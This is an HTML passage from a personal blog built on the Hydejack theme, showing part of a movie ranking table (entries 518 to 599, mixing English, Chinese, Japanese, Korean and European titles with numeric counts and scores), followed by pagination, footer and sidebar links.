class="xl63">給爸爸的信</td> <td class="xl66" align="right">13053</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">518</td> <td class="xl63">喋血双雄</td> <td class="xl66" align="right">12038</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">519</td> <td class="xl65">A Room with a View</td> <td class="xl66" align="right">12474</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">520</td> <td class="xl65">U-571</td> <td class="xl66" align="right">12577</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">521</td> <td class="xl65">Jane Eyre</td> <td class="xl66" align="right">12462</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">522</td> <td class="xl65">Back to the Future Part II</td> <td class="xl66" align="right">12053</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">523</td> <td class="xl65">The Family Man</td> <td class="xl66" align="right">12044</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">524</td> <td class="xl65">From Hell</td> <td class="xl66" align="right">12803</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">525</td> <td class="xl63">顽主</td> <td class="xl66" align="right">12014</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">526</td> <td class="xl63">没事偷着乐</td> <td class="xl66" align="right">12902</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">527</td> <td class="xl65">Notre Dame de Paris</td> <td class="xl66" align="right">12081</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">528</td> <td class="xl65">Die Another Day</td> <td class="xl66" align="right">13085</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">529</td> <td class="xl63">爱情麻辣烫</td> <td class="xl66" align="right">12488</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">530</td> <td class="xl63">古惑仔3之只手遮天</td> <td class="xl66" align="right">12324</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">531</td> <td class="xl65">xXx</td> <td class="xl66" align="right">12535</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">532</td> <td class="xl65">Star Wars: Episode V - The Empire Strikes Back</td> <td class="xl66" align="right">11415</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">533</td> <td class="xl65">Tomorrow Never Dies</td> <td class="xl66" align="right">12636</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">534</td> <td class="xl65">Det sjunde inseglet</td> <td class="xl66" align="right">11165</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">535</td> <td class="xl65">Bitter Moon</td> <td class="xl66" align="right">11609</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">536</td> <td class="xl65">Star Wars: Episode VI - Return of the Jedi</td> <td class="xl66" align="right">11372</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">537</td> <td class="xl65">Cube Zero</td> <td class="xl66" align="right">12566</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">538</td> <td class="xl63">蓝风筝</td> <td class="xl66" align="right">11078</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">539</td> <td class="xl65">Seabiscuit</td> <td class="xl66" align="right">11285</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">540</td> <td class="xl65">Wasabi</td> <td class="xl66" align="right">12593</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">541</td> <td class="xl65">Lemony Snicket's A Series of Unfortunate Events</td> <td class="xl66" align="right">11977</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">542</td> <td class="xl65">The Ninth Gate</td> <td class="xl66" align="right">12267</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">543</td> <td class="xl65">Spellbound</td> <td class="xl66" align="right">11019</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">544</td> <td class="xl65">The Exorcist</td> <td class="xl66" align="right">11744</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">545</td> <td class="xl65">The Pink Panther</td> <td class="xl66" align="right">12144</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">546</td> <td class="xl63">座頭市</td> <td class="xl66" align="right">11438</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">547</td> <td class="xl65">Undo</td> <td class="xl66" align="right">11976</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">548</td> <td class="xl63">宋家皇朝</td> <td class="xl66" align="right">11488</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">549</td> <td class="xl65">연애소설</td> <td class="xl66" align="right">11586</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">550</td> <td class="xl65">Alien³</td> <td class="xl66" align="right">11906</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">551</td> <td class="xl65">Leaving Las Vegas</td> <td class="xl66" align="right">10901</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">552</td> <td class="xl63">那时花开</td> <td class="xl66" align="right">12087</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">553</td> <td class="xl63">榴梿飘飘</td> <td class="xl66" align="right">11401</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">554</td> <td class="xl65">Raging Bull</td> <td class="xl66" align="right">10478</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">555</td> <td class="xl65">Scarface</td> <td class="xl66" align="right">10648</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">556</td> <td class="xl65">Robots</td> <td class="xl66" align="right">11379</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">557</td> <td class="xl65">Ultimo tango a Parigi</td> <td class="xl66" align="right">11447</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">558</td> <td class="xl65">Twister</td> <td class="xl66" align="right">11666</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">559</td> <td class="xl63">刮痧</td> <td class="xl66" align="right">11498</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">560</td> <td class="xl65">Back to the Future Part III</td> <td class="xl66" align="right">10680</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">561</td> <td class="xl65">Jeanne d'Arc</td> <td class="xl66" align="right">11227</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">562</td> <td class="xl63">飛鷹計劃</td> <td class="xl66" align="right">11443</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">563</td> <td class="xl63">少林寺</td> <td class="xl66" align="right">10759</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">564</td> <td class="xl65">Vertical Limit</td> <td class="xl66" align="right">11058</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">565</td> <td class="xl65">Dumb &amp; Dumber</td> <td class="xl66" align="right">11492</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">566</td> <td class="xl65">Taxi 3</td> <td class="xl66" align="right">11376</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">567</td> <td class="xl65">The Fast and the Furious</td> <td class="xl66" align="right">11226</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">568</td> <td class="xl65">The Wizard of Oz</td> <td class="xl66" align="right">10540</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">569</td> <td class="xl63">鹬蚌相争</td> <td class="xl66" align="right">10591</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">570</td> <td class="xl65">Frequency</td> <td class="xl66" align="right">10468</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">571</td> <td class="xl65">Fahrenheit 9/11</td> <td class="xl66" align="right">10682</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">572</td> <td class="xl65">Der Untergang</td> <td class="xl66" align="right">10013</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">573</td> <td class="xl65">97古惑仔战无不胜</td> <td class="xl66" align="right">11129</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">574</td> <td class="xl63">见鬼</td> <td class="xl66" align="right">11421</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">575</td> <td class="xl65">Indiana Jones and the Temple of Doom</td> <td class="xl66" align="right">10525</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">576</td> <td class="xl65">Platoon</td> <td class="xl66" align="right">10159</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">577</td> <td class="xl65">Pinocchio</td> <td class="xl66" align="right">10254</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">578</td> <td class="xl63">滚滚红尘</td> <td class="xl66" align="right">10142</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">579</td> <td class="xl65">Blue Velvet</td> <td class="xl66" align="right">10691</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">580</td> <td class="xl65">Lust och fägring stor</td> <td class="xl66" align="right">11021</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">581</td> <td class="xl63">巴尔扎克与小裁缝</td> <td class="xl66" align="right">10885</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">582</td> <td class="xl63">恋愛寫眞</td> <td class="xl66" align="right">10276</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">583</td> <td class="xl65">Road to Perdition</td> <td class="xl66" align="right">10415</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">584</td> <td class="xl65">나쁜남자</td> <td class="xl66" align="right">10514</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">585</td> <td class="xl63">失楽園</td> <td class="xl66" align="right">10731</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">586</td> <td class="xl65">봄날은간다</td> <td class="xl66" align="right">10043</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">587</td> <td class="xl63">少女小渔</td> <td class="xl66" align="right">10012</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">588</td> <td class="xl63">杀手阿一</td> <td class="xl66" align="right">10308</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">589</td> <td class="xl65">Dolls</td> <td class="xl66" align="right">10178</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">590</td> <td class="xl65">Alien: Resurrection</td> <td class="xl66" align="right">10379</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">591</td> <td class="xl65">Bad Boys</td> <td class="xl66" align="right">10224</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">592</td> <td class="xl63">六楼后座</td> <td class="xl66" align="right">10086</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">593</td> <td class="xl63">醉拳Ⅱ</td> <td class="xl66" align="right">10105</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">594</td> <td class="xl65">The Texas Chainsaw Massacre</td> <td class="xl66" align="right">10437</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">595</td> <td class="xl65">The World Is Not Enough</td> <td class="xl66" align="right">10284</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">596</td> <td class="xl65">8MM</td> <td class="xl66" align="right">10011</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">597</td> <td class="xl65">Tears of the Sun</td> <td class="xl66" align="right">10187</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">598</td> <td class="xl65">Eraser</td> <td class="xl66" align="right">10111</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">599</td> <td class="xl65">Sweet Home Alabama</td> <td class="xl66" align="right">10198</td> <td class="xl66" align="right">70</td> </tr> </tbody> </table> <p class="read-more">Continue reading <a class="heading" href="/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/2011/05/30/e5-b7-a8-e7-89-9b-e7-94-b5-e5-bd-b1-e6-a6-9c.html" data-flip="title">巨牛电影榜</a></p> </article> <h2 class="sr-only">Pagination</h2> <nav class="pagination heading" role="navigation"> <ul> <li class="pagination-item older" > <a rel="next" href="/page-56/">Older</a> </li> <li class="pagination-item newer" > <a rel="prev" href="/page-54/">Newer</a> </li> </ul> </nav> <footer> <hr/> <p>© 2011 - 2017. All rights reserved.</p> <p> <code>Powered by <a href="https://qwtel.com/hydejack/">Hydejack</a> v<span id="_version">6.6.1</span></code> </p> </footer> </main> </div> <div id="_yDrawer"> <div id="_sidebar" class="sidebar"> <div class="sidebar-bg" style="background-color:#4f86aa;background-image:url()"></div> <header class="sidebar-sticky" role="banner"> <div class="sidebar-about"> <img src="https://avatars0.githubusercontent.com/u/4122902?v=4&s=460" class="me" /> </div> <div class="sidebar-about"> <h1><a id="_title" href="/">Ka's Blog</a></h1> <p>Ka’s blog description…</p> </div> <nav class="sidebar-nav heading" role="navigation"> <span class="sr-only">Navigation:</span> <ul> <li> <a class="sidebar-nav-item" href="/categories.html">Categories</a> </li> <li> <a class="sidebar-nav-item" href="/archive.html">Archive</a> </li> <li> <a class="sidebar-nav-item" href="/tags.html">Tags</a> </li> <li> <a class="sidebar-nav-item" href="/about.html">About</a> </li> </ul> </nav> <div class="sidebar-social"> <span class="sr-only">Social:</span> <ul> <li> <a href="https://twitter.com/imhazige" title="Twitter"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a> </li> <li> <a href="https://github.com/imhazige" title="GitHub"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a> </li> <li> <a href="mailto:imhazige@gmail.com" title="Email"> <span class="icon-mail"></span> <span class="sr-only">Email</span> </a> </li> <li> <a href="https://imhazige.github.io/myblog/feed.xml" title="RSS"> <span class="icon-rss2"></span> <span class="sr-only">RSS</span> </a> </li> </ul> </div> </header> </div> </div> </div> <!--[if gt IE 9]><!----> <script>loadJSDeferred('/assets/js/hydejack.js?v=6.6.1');</script> <!--<![endif]--> </body>
</html>
